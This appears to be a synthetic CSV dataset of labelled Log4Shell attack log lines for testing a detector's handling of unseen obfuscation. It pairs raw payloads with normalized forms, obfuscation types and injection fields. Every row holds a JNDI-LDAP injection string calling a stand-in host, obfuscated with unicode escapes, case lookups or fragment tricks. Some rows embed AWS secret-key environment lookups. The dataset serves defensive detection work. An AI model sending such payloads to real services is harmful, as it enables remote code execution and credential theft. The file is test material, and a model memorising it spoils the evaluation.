id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000980,2026-05-17,synthetic,GET /?q=${\u006a\u006e\u0064\u0069:ldap://probe.example.net/unicode} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/unicode} http/1.1,1,log4shell,unicode_escape,minimal_query,unseen_obfuscation_test,critical
LS-000981,2026-05-17,synthetic,GET /api/check?debug=${\u006a\u006e\u0064\u0069:ldap://probe.example.net/unicode} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/unicode} http/1.1 host: app.local,1,log4shell,unicode_escape,uri_param,unseen_obfuscation_test,critical
LS-000982,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://probe.example.net/unicode} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://probe.example.net/unicode} | method: get | host: app.local | path: /login,1,log4shell,unicode_escape,user_agent,unseen_obfuscation_test,critical
LS-000983,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://probe.example.net/unicode},request from user-agent: ${jndi:ldap://probe.example.net/unicode},1,log4shell,unicode_escape,user_agent_minimal,unseen_obfuscation_test,critical
LS-000984,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://probe.example.net/unicode},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://probe.example.net/unicode},1,log4shell,unicode_escape,x_api_version,unseen_obfuscation_test,critical
LS-000985,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000986,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000987,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://probe.example.net/sep} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000988,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep},request from user-agent: ${jndi:ldap://probe.example.net/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000989,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://probe.example.net/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000990,2026-05-17,synthetic,GET /search?q=${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://probe.example.net/sep} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-000991,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep},post /search http/1.1 host: app.local body: query=${jndi:ldap://probe.example.net/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-000992,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000993,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000994,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://probe.example.net/sep} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000995,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep},request from user-agent: ${jndi:ldap://probe.example.net/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000996,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://probe.example.net/sep},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://probe.example.net/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-001105,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-001106,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-001107,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://lab-callback.example.org/nested} | method: get | host: app.local | path: /metrics,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-001108,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested},request from user-agent: ${jndi:ldap://lab-callback.example.org/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-001109,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://lab-callback.example.org/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-001110,2026-05-17,synthetic,GET /search?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://lab-callback.example.org/nested} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-001111,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/nested},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-001112,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-001113,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-001114,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://lab-callback.example.org/nested} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-001115,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested},request from user-agent: ${jndi:ldap://lab-callback.example.org/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-001116,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://lab-callback.example.org/nested},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://lab-callback.example.org/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-001117,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-001118,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-001119,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://lab-callback.example.org/lower} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-001120,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower},request from user-agent: ${jndi:ldap://lab-callback.example.org/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-001121,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://lab-callback.example.org/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-001122,2026-05-17,synthetic,GET /search?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://lab-callback.example.org/lower} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-001123,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/lower},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-001124,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-001125,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-001126,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://lab-callback.example.org/lower} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-001127,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower},request from user-agent: ${jndi:ldap://lab-callback.example.org/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-001128,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lab-callback.example.org/lower},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://lab-callback.example.org/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-001129,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-001130,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-001131,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://lab-callback.example.org/upper} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-001132,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper},request from user-agent: ${jndi:ldap://lab-callback.example.org/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-001133,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://lab-callback.example.org/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-001134,2026-05-17,synthetic,GET /search?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndi:ldap://lab-callback.example.org/upper} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-001135,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/upper},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-001136,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-001137,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-001138,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://lab-callback.example.org/upper} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-001139,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper},request from user-agent: ${jndi:ldap://lab-callback.example.org/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-001140,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://lab-callback.example.org/upper},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://lab-callback.example.org/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-001141,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-001142,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-001143,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://lab-callback.example.org/env} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-001144,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env},request from user-agent: ${jndi:ldap://lab-callback.example.org/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-001145,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://lab-callback.example.org/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-001146,2026-05-17,synthetic,GET /search?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://lab-callback.example.org/env} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,nested_lookup_env_fallback,path,unseen_obfuscation_test,critical
LS-001147,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/env},1,log4shell,nested_lookup_env_fallback,body,unseen_obfuscation_test,critical
LS-001148,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-001149,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-001150,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://lab-callback.example.org/env} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-001151,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env},request from user-agent: ${jndi:ldap://lab-callback.example.org/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-001152,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://lab-callback.example.org/env},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://lab-callback.example.org/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-001153,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-001154,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-001155,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://lab-callback.example.org/frag} | method: get | host: app.local | path: /home,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-001156,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag},request from user-agent: ${jndi:ldap://lab-callback.example.org/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-001157,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://lab-callback.example.org/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-001158,2026-05-17,synthetic,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://lab-callback.example.org/frag} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-001159,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-001160,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-001161,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
